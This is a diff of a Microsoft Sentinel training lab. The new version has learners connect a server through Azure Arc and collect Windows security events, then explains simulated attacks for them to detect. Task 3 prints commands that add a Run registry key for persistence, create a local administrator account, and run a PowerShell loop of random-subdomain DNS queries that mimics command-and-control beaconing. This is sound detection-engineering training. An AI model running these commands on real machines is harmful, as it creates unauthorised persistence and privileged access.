@@ -1,83 +1,199 @@
 ---
 lab:
-  title: Exercise 4 - Explore Entity Behavior Analytics
-  module: Learning Path 9 - Create detections and perform investigations using Microsoft Sentinel
-  description: In this task, you will explore Entity behavior analytics in Microsoft Sentinel.
-  duration: 15 minutes
-  level: 200
-  islab: true
-  primarytopics:
-    - Microsoft Sentinel
+    title: 'Exercise 4 - Prepare to perform simulated attacks'
+    module: 'Learning Path 9 - Create detections and perform investigations using Microsoft Sentinel'
 ---
 
-# Learning Path 9 - Lab 1 - Exercise 4 - Explore Entity Behavior Analytics
+# Learning Path 9 - Lab 1 - Exercise 4 - Prepare to perform simulated attacks
 
 ## Lab scenario
 
-You are a Security Operations Analyst working at a company that implemented Microsoft Sentinel. You already created Scheduled and Microsoft Security Analytics rules.
+![Lab overview.](../Media/SC-200-Lab_Diagrams_Mod9_L1_Ex5.png)
 
-You need to configure Microsoft Sentinel to perform Entity Behavior Analytics to discover anomalies and provide entity analytic pages.
+>**Important**: The lab exercises for Learning Path #9 are in a *standalone, shared* environment. Other students are using the same environment. You will need to coordinate with the other students on who will perform these tasks. First, we will check to see if the environment is already configured before you proceed. Also, if you exit the lab before completing it, you will be required to re-run the configurations again.
 
->**Important:** The lab exercises for Learning Path #9 are in a *standalone* environment. If you exit the lab before completing it, you will be required to re-run the configurations again.
+### Estimated time to complete this lab: 30 minutes
 
-### Estimated time to complete this lab: 15 minutes
+### Task 1: Connect an On-Premises Server
 
-### Task 1: Explore Entity Behavior
+In this task, you'll connect an on-premises server to your Azure subscription. Azure Arc was pre-installed on this server. The server will be used in next exercises to run simulated attacks that you will later detect and investigate in Microsoft Sentinel.
 
-In this task, you will explore Entity behavior analytics in Microsoft Sentinel.
+>**Important:** The next steps are done on a different machine than the one you were previously working. Look for the Virtual Machine name in the references tab.
 
->**Note:** Microsoft Sentinel has been predeployed in your Azure subscription with the name **defenderWorkspace**, and the required *Content Hub* solutions have been installed.
+As described above, the Azure Arc Connected Machine agent (azcmagent) has been pre-installed on the **WINServer** machine. Before you attempt to connect this machine to your Azure subscription we will check the connection status.
 
-1. Log in to WIN1 virtual machine as Admin with the password: **Pa55w.rd**.  
+1. Sign in to the **WINServer** virtual machine using the provided credentials.
 
-1. In the Edge browser, navigate to the Azure portal at <https://portal.azure.com>.
+1. On the **WINServer** virtual machine, select the **search** icon and type *cmd*.
 
-1. In the **Sign in** dialog box, copy and paste in the **Tenant Email** account provided by your lab hosting provider and then select **Next**.
+1. In search results right click *Command Prompt* and select **Run as administrator**.
 
-1. In the **Enter password** dialog box, copy and paste in the **Tenant Password** provided by your lab hosting provider and then select **Sign in**.
+1. In the Command Prompt window, type the following command to check the connection status of the Azure Arc agent:
 
-1. In the Search bar of the Azure portal, type *Sentinel*, then select **Microsoft Sentinel**.
+    ```cmd
+    azcmagent show
+    ```
+1. If the command output shows that *Agent status* is **Connected**. proceed to **Task 2**. 
 
-1. Select the Microsoft Sentinel **defenderWorkspace**.
+1. If it is not connected, perform the following steps before proceeding to reconnect **WINServer** to Azure Arc:
 
-1. Select the **Entity behavior** page.
+    1. Open the the Azure portal `https://portal.azure.com` in the *Microsoft Edge* browser, and verify that it is *not* listed as a resource in the *SentinelStatic* resource group. If it is, select it and delete it from the resource group.
+    
+    1. After **WINServer** is deleted from the resource group, run the following command from the **WINServer** command Prompt to make sure it is disconnected from Azure Arc:
 
-1. On the popup from *Entity behavior settings*, select **Set UEBA**.
+        ```cmd
+        azcmagent disconnect --force-local-only
+        ```
+    1. Leave the browser and Command Prompt windows open for the next steps.
 
-1. On the *Settings* tab under *Entity behaviour analytics*, scroll down the *Anomalies* section and verify read through the paragraph, and verify that the *switch* is *On*.
+1. Run the following command to connect the machine to Azure Arc:
 
-1. Select the **Go to analytics in oder to configure the anomalies** link.
+    ```cmd
+    azcmagent connect -g "SentinelStatic" -l "CentralUS" -s "Subscription ID string"
+    ```
+1. Replace the **Subscription ID string** with the *Subscription ID* provided by your lab hoster (*Resources tab). Make sure to keep the quotes.
 
-### Task 2: Confirm and review Anomalies rules
+1. Type *Enter* to run the command (this may take a couple minutes).
 
-In this task, you will confirm Anomalies analytics rules are enabled.
+    >**Note**: If you see the *How do you want to open this?* browser selection window, select **Microsoft Edge**.
 
-1. You should be now at the *Analytics* page, *Anomalies* tab.
+1. In the **Sign in** dialog box, enter your **Tenant Email** and **Tenant Password** provided by your lab hosting provider and select **Sign in**. Wait for the *Authentication complete* message, close the browser tab and return to the *Command Prompt* window.
 
-1. Confirm status column of the rules is *Enabled*.
+    >**Note:** You may be prompted to enter the *Temporary Access Pass* (TAP) instead of a password. This is also provided in the resources tab. If prompted, copy and paste the TAP value and select **Sign in**.
 
-1. Select any rule and then select **Edit** on the rule blade.
+1. When the commands complete running, leave the *Command Prompt* window open and type the following command to confirm that the connection was successful:
 
-1. Review the *General* tab information. Notice the *Mode* is **Production** and then select **Next: Configuration**.
+    ```cmd
+    azcmagent show
+    ```
+1. In the command output, verify that *Agent status* is **Connected**.
 
-1. Review the *Configuration* tab information. Notice that you cannot change the **Anomaly score threshold**.
+## Task 2: Connect a non-Azure Windows Machine
 
-1. Then select **X** in the top right corner to exit the Analytics rule wizard.
+In this task, you'll add an Azure Arc connected, on-premises machine to Microsoft Sentinel.  
 
-1. Scroll right to the analytics rule you selected until see and select the ellipsis **(...)** icon.
+>**Note:** Microsoft Sentinel has been predeployed in your Azure subscription with the name **sentinelworkspace-01**, and the required *Content hub* solutions have been installed.
 
-1. Select **Duplicate** and scroll left to review the new rule with the **FLGT** tab at the beginning of the name.
+1. Sign in to the **WIN1** virtual machine using the provided credentials.
 
-1. Select **FLGT** rule and then select **Edit** on the rule blade.
+1. In the **Microsoft Edge** browser, navigate to **Microsoft Defender XDR** at `https://security.microsoft.com`.
 
-1. Review the *General* tab information. Notice the *Mode* is **Flighting** and then select **Next: Configuration**.
+1. In the **Sign in** dialog box, copy, and paste in the **Tenant Email** account provided by your lab hosting provider and then select **Next**.
 
-1. Review the *Configuration* tab information. Notice that you can now change the **Anomaly score threshold**.
+1. In the **Enter password** dialog box, copy, and paste in the **Tenant Password** provided by your lab hosting provider and then select **Sign in**.
 
-1. Set the value to **1** and then select **Next: Submit Feedback**.
+    >**Note:** You may be prompted to enter the *Temporary Access Pass* (TAP) instead of a password. This is also provided in the resources tab. If prompted, copy and paste the TAP value and select **Sign in**.
 
-1. Select **Next: Review and Create** and then **Save** to update the rule.
+1. In the Microsoft Defender navigation menu, scroll down and expand the **Microsoft Sentinel** section.
 
-    >**Note:** You can upgrade the **Flighting** rule to **Production** by changing the setting on this rule and save the changes. The **Production** rule will become the **Flighting** rule afterwards.
+1. Expand the **Configuration** section and select **Data connectors**.
+
+1. In the **Data connectors**, search for the **Windows Security Events via AMA** solution and select it from the list.
+
+1. On the **Windows Security Events via AMA** details pane, select **Open connector page**.
+
+    >**Note:** The *Windows Security Events* solution installs both the *Windows Security Events via AMA* and the *Security Events via Legacy Agent* Data connectors. Plus 2 Workbooks, 20 Analytic Rules, and 43 Hunting Queries.
+
+1. In the **Configuration** section, under the rules section, select the **Create data collection rule**.
+
+1. Enter a Rule Name like **WINSERVERDCR** for the DCR, then select **Next: Resources >**.
+
+    >**Note:** Use a unique name for the Rule Name, consider using your *Student* username number to make it unique, for example, **WINXXXXXXXXDCR**.
+
+1. Expand your *Subscription* under *Scope* on the *Resources* tab.
+
+    >**Hint:** You can expand the whole *Scope* hierarchy by selecting the ">" before the *Scope* column.
+
+1. Expand **SentinelStatic** Resource Group, then select **WINServer**.
+
+1. Select **Next: Collect >** button, and leave the *All Security Events* selected.
+
+1. Select **Next: Review + create >**.
+
+1. Select **Create** after *Validation passed* is displayed.
+
+### Task 3: Understand the Attacks
+
+>**Important: You will perform no actions in this exercise.**  These instructions are only an explanation of the attacks you will perform in the next exercise. Please carefully read this page.
+
+The attack patterns are based on an open-source project: `https://github.com/redcanaryco/atomic-red-team`
+
+#### Attack 1 - Persistence with Registry Key Add
+
+Attackers will add a program in the Run Registry key. This achieves persistence by making the program run every time the user logs on.
+
+```
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
+```
+
+#### Attack 2 - User Add and Elevate Privilege
+
+Attackers will add new users and elevate the new user to the Administrators group. This enables the attacker to logon with a different account that is privileged.
+
+```
+net user theusernametoadd /add
+net user theusernametoadd ThePassword1!
+net localgroup administrators theusernametoadd /add
+```
+
+#### Attack 3 - DNS / C2
+
+Attacker will send a large volume of DNS queries to a command and control (C2) server. The intent is to trigger threshold-based detection on the number of DNS queries either from a single source system or to a single target domain.
+
+```
+param(
+    [string]$Domain = "microsoft.com",
+    [string]$Subdomain = "subdomain",
+    [string]$Sub2domain = "sub2domain",
+    [string]$Sub3domain = "sub3domain",
+    [string]$QueryType = "TXT",
+        [int]$C2Interval = 8,
+        [int]$C2Jitter = 20,
+        [int]$RunTime = 240
+)
+$RunStart = Get-Date
+$RunEnd = $RunStart.addminutes($RunTime)
+$x2 = 1
+$x3 = 1 
+Do {
+    $TimeNow = Get-Date
+    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+    if ($x2 -eq 3 )
+    {
+        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+        $x2 = 1
+    }
+    else
+    {
+        $x2 = $x2 + 1
+    }
+    if ($x3 -eq 7 )
+    {
+        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+        $x3 = 1
+    }
+    else
+    {
+        $x3 = $x3 + 1
+    }
+    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
+    Start-Sleep -Seconds $Jitter
+}
+Until ($TimeNow -ge $RunEnd)
+```
+
+### Task 4: Understand Detection Modeling
+
+The attack-detect configuration cycle used in this lab represents all data sources even though you are only focused on two specific data sources.
+
+To build a detection, you first start with building a KQL statement. Since you will attack a host, you will have representative data to start building the KQL statement.
+
+After you have the KQL statement, you create the Analytical Rule.
+
+Once the rule triggers and creates the alerts and incidents, you then investigate to decide if you are providing fields that help Security Operations Analysts in their investigation.
+
+Next, you will make other changes to the analytics rule.
+
+>**Note:** Some alerts will be triggered in a smaller time-frame just for our lab purpose.
 
 ## Proceed to Exercise 5
